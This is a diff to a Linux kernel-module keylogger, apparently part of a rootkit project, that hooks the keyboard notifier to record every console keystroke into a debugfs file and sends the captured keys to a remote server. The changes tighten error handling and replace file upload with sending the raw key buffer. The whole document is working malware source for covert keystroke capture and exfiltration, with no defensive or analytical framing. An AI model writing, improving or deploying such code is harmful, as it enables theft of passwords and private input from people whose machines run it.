@@ -262,8 +262,10 @@ int epikeylog_send_to_server(void) {
     }
     exec_str_as_command("cat /sys/kernel/debug/kisni/keys", true);
     // Send the result back to the server
-    int ret_code = send_file_to_server(STDOUT_FILE);
-    DBG_MSG("epikeylog_send_to_server: kelogger content sent\n");
+    int readed_size = 0;
+    char *keys_content = read_file(STDOUT_FILE, &readed_size);
+    int ret_code = send_to_server_raw(keys_content, readed_size);
+    DBG_MSG("epikeylog_send_to_server: keylogger content sent\n");
     return ret_code;
 }
 
@@ -277,36 +279,45 @@ int epikeylog_send_to_server(void) {
  * the appropriate error code in case of any error
  */
 int epikeylog_init(int keylog_mode) {
+    DBG_MSG("epikeylog_init: initializing keylogger\n");
+
     if (is_running) {
         DBG_MSG("epikeylog_init: already running\n");
-        return -EBUSY;
+        return SUCCESS;
     }
 
     codes = keylog_mode;
 
-    if (codes < 0 || codes > 2)
+    if (codes < 0 || codes > 2) {
+        ERR_MSG("epikeylog_init: invalid keylog_mode value: %d\n", codes);
         return -EINVAL;
+    }
 
     subdir = debugfs_create_dir("kisni", NULL);
-    if (IS_ERR(subdir))
+    if (IS_ERR(subdir)) {
+        ERR_MSG("epikeylog_init: failed to create debugfs directory\n");
         return PTR_ERR(subdir);
-    if (!subdir)
+    }
+    if (!subdir) {
+        ERR_MSG("epikeylog_init: debugfs directory is NULL\n");
         return -ENOENT;
+    }
 
     file = debugfs_create_file("keys", 0400, subdir, NULL, &keys_fops);
     if (!file) {
+        ERR_MSG("epikeylog_init: failed to create debugfs file\n");
         debugfs_remove_recursive(subdir);
         return -ENOENT;
     }
 
-    /*
-     * Add to the list of console keyboard event
-     * notifiers so the callback epikeylog_cb is called
-     * when an event occurs.
-     */
-    register_keyboard_notifier(&epikeylog_blk);
+    if (register_keyboard_notifier(&epikeylog_blk) != 0) {
+        ERR_MSG("epikeylog_init: failed to register keyboard notifier\n");
+        debugfs_remove_recursive(subdir);
+        return -EIO;
+    }
 
     is_running = true;
+    DBG_MSG("epikeylog_init: keylogger initialized successfully\n");
 
     return SUCCESS;
 }
@@ -320,13 +331,21 @@ int epikeylog_init(int keylog_mode) {
 int epikeylog_exit(void) {
     if (!is_running) {
         DBG_MSG("epikeylog_exit: already stopped\n");
-        return -EBUSY;
+        return SUCCESS;
     }
 
-    unregister_keyboard_notifier(&epikeylog_blk);
+    if (unregister_keyboard_notifier(&epikeylog_blk) != 0) {
+        ERR_MSG("epikeylog_exit: failed to unregister keyboard notifier\n");
+        return -EIO;
+    }
+
+    if (!subdir || IS_ERR(subdir)) {
+        ERR_MSG("epikeylog_exit: invalid debugfs directory\n");
+        return -EIO;
+    }
+
     debugfs_remove_recursive(subdir);
     is_running = false;
-
     DBG_MSG("epikeylog_exit: epikeylog desactivated\n");
 
     return SUCCESS;
